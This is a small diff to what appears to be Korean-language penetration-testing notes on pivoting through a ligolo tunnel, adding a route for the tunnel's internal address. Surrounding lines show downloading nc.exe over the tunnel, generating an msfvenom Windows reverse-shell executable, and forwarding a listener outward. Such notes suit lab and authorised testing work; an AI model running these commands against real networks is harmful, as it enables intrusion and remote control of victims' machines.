@@ -48,6 +48,9 @@ start
 # internal IP
 sudo ip route add 192.168.148.0/24 dev ligolo 
 sudo ip route list
+
+# 연결 후 내부망 사용 주소 추가.
+sudo ip route add 240.0.0.1/32 dev ligolo
 ```
 ```powershell
 curl http://<tunneling ip>:8888/nc.exe -o c:\temp\nc.exe
@@ -58,6 +61,7 @@ msfvenom -p windows/shell_reverse_tcp lhost=<tunneling ip> lport=8888 -f exe -o 
 
 # 내부망에서 외부망으로 패킷 전달
 listener_add --addr 0.0.0.0:8888 --to <lhost>:80
+
 ```
   
 </details>
